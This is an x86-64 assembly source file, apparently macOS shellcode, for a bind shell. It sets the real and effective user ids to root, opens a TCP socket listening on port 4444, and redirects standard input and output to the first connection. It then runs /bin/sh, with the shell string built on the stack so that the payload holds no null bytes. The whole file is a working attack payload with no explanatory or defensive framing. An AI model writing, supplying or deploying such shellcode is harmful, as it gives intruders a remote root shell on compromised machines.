BITS 64

global start

start:
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x17                 ; setreuid is 0x17
  mov rax, r8                 ; put setreuid syscall # into rax

  xor rdi, rdi                ; real userid
  xor rsi, rsi                ; effective userid
  syscall                     ; setreuid(ruid, euid)

  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x61                 ; socket is 0x61
  mov rax, r8                 ; call socket(AF_INET, SOCK_STREAM, 0)

  mov dil, 2                  ; AF_NET = 2 to remove the trailing null
  mov sil, 1                  ; SOCK_STREAM = 1
  xor rdx, rdx                ; protocol, set to 0
  syscall
  mov r12, rax                ; save socket from call

sock_addr:
  xor r8, r8                  ; clear the value of r8
  push r8                     ; push r8 to the stack as it's null (INADDR_ANY = 0)
  push WORD 0x5C11            ; push our port number to the stack (Port = 4444)
  push WORD 2                 ; push protocol argument to the stack (AF_INET = 2)
  mov r13, rsp                ; Save the sock_addr_in into r13

;bind
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x68                 ; bind is 0x68
  mov rax, r8                 ; bind(sockfd, sockaddr, addrleng);

  mov rdi, r12                ; sockfd from socket syscall
  mov rsi, r13                ; sockaddr 
  mov dl, 0x10                ; addrleng the ip address length
  syscall

;listen
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x6A                 ; listen is 0x6A
  mov rax, r8                 ; listen(sockfd, backlog);

  mov rdi, r12                ; sockfd
  xor rsi, rsi                ; backlog
  syscall

;accept
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x1E                 ; accept is 0x1E
  mov rax, r8                 ; accept(sockfd, sockaddr, socklen);

  mov rdi, r12                ; sockfd
  xor rsi, rsi                ; sockaddr
  xor rdx, rdx                ; socklen
  syscall
  mov r12, rax                ; store fd in r12 to use in dup

dup:                          ; dup2 for stdin, stdout and stderr
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x5A                 ; dup2 is 0x5A
  mov rax, r8                 ; move the syscall for dup2 into rax
  mov rdi, r12                ; move the FD for the socket into rdi
  mov rsi, r15
  syscall                     ; call dup2(rdi, rsi)

  cmp r15, 2                  ; check to see if we are still under 2
  inc r15                     ; inc rsi
  jbe short dup               ; jmp if less than 2

;execve
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x3B                 ; execve is 0x3B
  mov rax, r8                 ; execve(char *fname, char **argp, char **envp);
  xor rdi,rdi                 ;
  push rdi                    ;
  mov rdi, 0x68732f2f6e69622f ; to get rid of the null terminated shell string, construct on the fly
  push rdi                    ;
  mov rdi, rsp                ,
  xor rsi, rsi                ; set argp to NULL
  xor rdx, rdx                ; set envp to NULL
  syscall

